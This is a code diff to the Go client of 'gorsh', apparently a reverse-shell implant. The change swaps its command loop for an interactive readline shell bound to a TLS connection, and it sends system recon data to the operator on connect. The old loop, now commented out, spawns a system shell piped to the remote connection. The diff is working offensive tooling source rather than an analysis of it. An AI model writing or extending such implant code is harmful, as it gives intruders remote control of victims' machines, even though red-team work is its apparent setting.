@@ -1,7 +1,7 @@
 package main
 
 import (
-	"bufio"
+	// "bufio"
 	"bytes"
 	"crypto/sha256"
 	"crypto/tls"
@@ -11,8 +11,10 @@ import (
 	"os"
 	"strings"
 
-	"github.com/audibleblink/gorsh/internal/commands"
-	"github.com/audibleblink/gorsh/internal/shell"
+	"github.com/abiosoft/ishell"
+	"github.com/abiosoft/readline"
+
+	"github.com/audibleblink/gorsh/internal/cmds"
 	"github.com/audibleblink/gorsh/internal/sitrep"
 )
 
@@ -22,49 +24,58 @@ const (
 	ErrBadFingerprint  = iota
 )
 
-var connectString string
-var fingerPrint string
+var (
+	connectString string
+	fingerPrint   string
+)
 
 type writer interface {
 	Write(s []byte) (int, error)
 	Read(s []byte) (int, error)
+	Close() error
 }
 
 func send(conn writer, msg string) {
-	// conn.Write([]byte("\n"))
 	conn.Write([]byte(msg))
 	conn.Write([]byte("\n"))
 }
 
 func startShell(conn writer) {
-	name, _ := os.Hostname()
-	prompt := fmt.Sprintf("\n[%s]> ", name)
-	scanner := bufio.NewScanner(conn)
+	hostname, _ := os.Hostname()
 
-	// Print basic recon data on first connect
+	sh := ishell.NewWithConfig(&readline.Config{
+		Prompt:      fmt.Sprintf("[%s]> ", hostname),
+		Stdin:       conn,
+		StdinWriter: conn,
+		Stdout:      conn,
+		Stderr:      conn,
+		VimMode:     true,
+	})
+
+	cmds.RegisterCommands(sh)
 	send(conn, sitrep.SysInfo())
-	conn.Write([]byte(prompt))
+	sh.Run()
+	os.Exit(0)
 
-	for scanner.Scan() {
-		command := scanner.Text()
-		switch command {
-		case "":
-			send(conn, "")
-		case "exit":
-			os.Exit(0)
-		case "shell":
-			cmd := shell.GetShell()
-			cmd.Stdout = conn
-			cmd.Stderr = conn
-			cmd.Stdin = conn
-			cmd.Run()
-		default:
-			argv := strings.Split(command, " ")
-			out := commands.Route(argv)
-			send(conn, out)
-		}
-		conn.Write([]byte(prompt))
-	}
+	// for scanner.Scan() {
+	// 	command := scanner.Text()
+	// 	switch command {
+	// 	case "":
+	// 		send(conn, "")
+	// 	case "exit":
+	// 		os.Exit(0)
+	// 	case "shell":
+	// 		cmd := shell.GetShell()
+	// 		cmd.Stdout = conn
+	// 		cmd.Stderr = conn
+	// 		cmd.Stdin = conn
+	// 		cmd.Run()
+	// 	default:
+	// 		argv := strings.Split(command, " ")
+	// 		out := commands.Route(argv)
+	// 		send(conn, out)
+	// 	}
+	// }
 }
 
 func isValidKey(conn *tls.Conn, fingerprint []byte) bool {
